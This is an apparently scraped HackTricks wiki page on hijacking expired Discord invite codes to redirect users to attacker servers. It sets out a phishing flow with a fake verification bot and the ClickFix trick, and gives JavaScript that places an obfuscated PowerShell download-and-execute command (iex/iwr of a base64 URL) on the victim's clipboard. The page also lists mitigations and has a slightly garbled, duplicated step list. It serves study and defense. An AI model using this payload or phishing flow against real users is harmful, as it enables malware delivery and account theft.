---
title: "Discord Invite Hijacking"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/generic-methodologies-and-resources/phishing-methodology/discord-invite-hijacking.html
fetched_at: 2026-09-20T08:53:25Z
license: unspecified
category: redteam
---

## Invite Types and Hijack Risk

The observed risk differs by invite type:[\[1\]](#references)[\[2\]](#references)

| Invite Type | Hijackable? | Condition / Comments |
|---|---|---|
| Temporary Invite Link | ✅ | After expiration, the code becomes available and can be re-registered as a vanity URL by a boosted server. |
| Permanent Invite Link | ⚠️ | If deleted and consisting only of lowercase letters and digits, the code may become available again. |
| Custom Vanity Link | ✅ | If the original server loses its Level 3 Boost, its vanity invite becomes available for new registration. |

## Exploitation Steps

1. Reconnaissance
2. Pre-registration
3. Hijack Activation
4. Silent Redirection
  - Users visiting the old link are seamlessly sent to the attacker-controlled server once the hijack is active.<sup>[\[1\]](#references)</sup>
5. Users visiting the old link are seamlessly sent to the attacker-controlled server once the hijack is active.

## Phishing Flow via Discord Server

1. Restrict server channels so only a **#verify** channel is visible.<sup>[\[1\]](#references)</sup>
2. Deploy a bot (e.g., **Safeguard#0786** ) to prompt newcomers to verify via OAuth2.<sup>[\[1\]](#references)</sup>
3. Bot redirects users to a phishing site (e.g., `captchaguard.me` ) under the guise of a CAPTCHA or verification step.<sup>[\[1\]](#references)</sup>
4. Implement the **ClickFix** UX trick:<sup>[\[1\]](#references)</sup>  - Display a broken CAPTCHA message.
  - Guide users to open the **Win+R** dialog, paste a preloaded PowerShell command, and press Enter.

### ClickFix Clipboard Injection Example

The campaign used JavaScript to copy a malicious PowerShell command to the clipboard:[\[1\]](#references)

```
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
            `$u=($r[-1..-($r.Length)]-join '');` +
            `$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
            `iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
This approach avoids direct file downloads and leverages familiar UI elements to lower user suspicion.[\[1\]](#references)

## Mitigations

- Prefer permanent invite links and ensure the code contains at least one uppercase letter; deleted permanent codes containing uppercase letters cannot be reused as vanity links.<sup>[\[1\]](#references)</sup>
- Regularly rotate invite codes and revoke old links.
- Monitor Discord server boost status and vanity URL claims.<sup>[\[1\]](#references)[\[2\]](#references)</sup>
- Educate users to verify server authenticity and avoid executing clipboard-pasted commands.

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
